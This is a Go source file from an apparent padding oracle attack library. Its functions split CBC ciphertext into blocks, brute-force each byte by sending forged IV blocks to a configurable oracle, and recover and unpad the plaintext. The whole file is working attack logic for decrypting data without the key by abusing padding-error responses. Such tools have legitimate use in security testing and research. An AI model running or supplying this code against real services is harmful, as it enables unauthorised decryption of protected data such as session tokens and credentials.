package libpadoracle

import (
	"encoding/hex"
	"fmt"
	"sync"

	"github.com/gosuri/uiprogress"
)

func GetRangeDataSafe() []int {
	rangeData := []int{}
	for i := 3; i < 256; i++ {
		rangeData = append(rangeData, i)
	}
	rangeData = append(rangeData, []int{0, 2, 1}...)
	return rangeData
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PadOperations(wg *sync.WaitGroup, cfg *Config, cipherText []byte, decipherChan chan Data) {
	defer func() {
		close(decipherChan)
		wg.Done()
	}()

	threadCh := make(chan struct{}, cfg.Threads)
	wg2 := sync.WaitGroup{}
	if cfg.IV != nil { // IV was supplied by the user - let's prepend to the Decoded Ciphertext
		cipherText = append(cfg.IV, cipherText...)
	}
	Blocks := ChunkBytes(cipherText, cfg.BlockSize)
	cfg.NumBlocks = len(Blocks)
	wg.Add(1)
	go WriteOutput(wg, decipherChan, cfg)

	// fmt.Println(Blocks)
	if lastBlockLen := len(Blocks[len(Blocks)-1]); lastBlockLen != cfg.BlockSize {
		err := fmt.Errorf("Invalid Block Size at Block #%d (%v bytes - should be %d)", len(Blocks), lastBlockLen, cfg.BlockSize)
		panic(err)
	}
	endBlock := len(Blocks)
	fmt.Printf("Total Blocks: [%v]\n", len(Blocks))
	startBlock := 1
	for blockNum, blockData := range Blocks[startBlock:endBlock] {
		wg2.Add(1)
		go PerBlockOperations(&wg2, *cfg, threadCh, decipherChan, blockNum+startBlock, blockData, Blocks[blockNum+startBlock-1])
	}
	wg2.Wait()
}

// PerBlockOperations performs the actual math on each byte of the CipherText
func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, decipherChan chan Data, blockNum int, blockData []byte, iv []byte) {
	// TODO stuff here
	defer func() {
		wg.Done()
	}()
	var strData string
	var outData string
	bar := uiprogress.AddBar(cfg.BlockSize).AppendCompleted().PrependElapsed()
	bar.Empty = ' '
	bar.PrependFunc(func(b *uiprogress.Bar) string {
		return strData
	})
	bar.AppendFunc(func(b *uiprogress.Bar) string {
		return outData
	})
	rangeData := GetRangeDataSafe()
	blockDecipherChan := make(chan byte, 1)
	returnData := Data{}
	decipheredBlockBytes := []byte{}
	wg2 := sync.WaitGroup{}
	for byteNum, _ := range blockData { // Iterate over each byte
		continueChan := make(chan bool, 1)

		wg2.Add(1)
		// var found bool
		// Iterate through each possible byte value until padding error goes away
		for _, i := range rangeData {
			var found bool = false
			strData = fmt.Sprintf("Block [%v]\t[%v%v%v]", blockNum, b.Sprintf("%x", blockData[:len(blockData)-1-byteNum]), y.Sprintf("%02x", i), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes)))
			threadCh <- struct{}{}
			if blockNum == cfg.NumBlocks-1 && byteNum == 0 { // Edge case for the VERY LAST byte of ciphertext;
				// 	// this one will ALWAYS allow 0x01 to be valid (as 1 byte of padding in the final block is always a valid value)
				// 	// Additionally, there's a 1/256 chance that 0x02 will be valid
				// 	// The probability of each successive value is exponential, so we can probably assume it's not likely
				found = PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes, continueChan)
			} else {
				go PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes, continueChan)
			}
			if found {
				break
			}
		}
		nextByte := <-blockDecipherChan
		strData = fmt.Sprintf("Block [%v]\t[%v%v%v]", blockNum, b.Sprintf("%x", blockData[:len(blockData)-1-byteNum]), r.Sprintf("%02x", nextByte), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes)))

		decipheredBlockBytes = append([]byte{nextByte}, decipheredBlockBytes...)
		bar.Incr()
		wg2.Wait()
	}
	returnData.BlockNumber = blockNum
	returnData.EncryptedBlockData = blockData
	returnData.DecipheredBlockData = decipheredBlockBytes
	if blockNum == cfg.NumBlocks-1 { // Last block - unpad before saving cleartext
		returnData.UnpaddedCleartext = string(Unpad(decipheredBlockBytes))
	} else {
		returnData.UnpaddedCleartext = string(decipheredBlockBytes)
	}
	outData = fmt.Sprintf("Decrypted [%v]\n╰> Original Ciphertext:\t[%v]\n╰> Decrypted (Hex):\t[%v]\n╰> Cleartext:\t\t[%v]\n", r.Sprintf("Block %d", returnData.BlockNumber), b.Sprintf(hex.EncodeToString(returnData.EncryptedBlockData)), g.Sprintf(hex.EncodeToString(returnData.DecipheredBlockData)), gb.Sprintf(returnData.UnpaddedCleartext))

	decipherChan <- returnData
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PerByteOperations(wg *sync.WaitGroup, threadCh chan struct{}, blockDecipherChan chan byte, cfg Config, bruteForceByteValue int, byteNum int, blockNum int, blockData []byte, IV []byte, decipheredBlockBytes []byte, continueChan chan bool) bool {
	defer func() {
		<-threadCh // Release a thread once we're done with this goroutine
	}()
	select {
	case <-continueChan:
		return false
	default:
		var RawOracleData []byte
		// Math here - all the XORing and building of weird padding happens in these routines
		padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)
		searchBlock := BuildSearchBlock(decipheredBlockBytes, bruteForceByteValue, cfg.BlockSize)
		tmp := XORBytes(searchBlock, IV)
		oracleIvBlock := XORBytes(tmp, padBlock)

		RawOracleData = BuildRawOraclePayload(oracleIvBlock, blockData)
		// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)

		encodedPayload := cfg.Pad.EncodePayload(RawOracleData)
		resp := cfg.Pad.CallOracle(encodedPayload)
		cfg.MetricsChan <- 1
		if cfg.Pad.CheckResponse(resp) { // this one didn't return a pad error - we've probably decrypted it!
			defer wg.Done()
			continueChan <- true
			close(continueChan)
			blockDecipherChan <- byte(bruteForceByteValue)
			if byteNum == cfg.BlockSize {
				close(blockDecipherChan)
			}
			return true
		}
		return false // This is to aid with detection of the final ciphertext's pad byte
	}
}
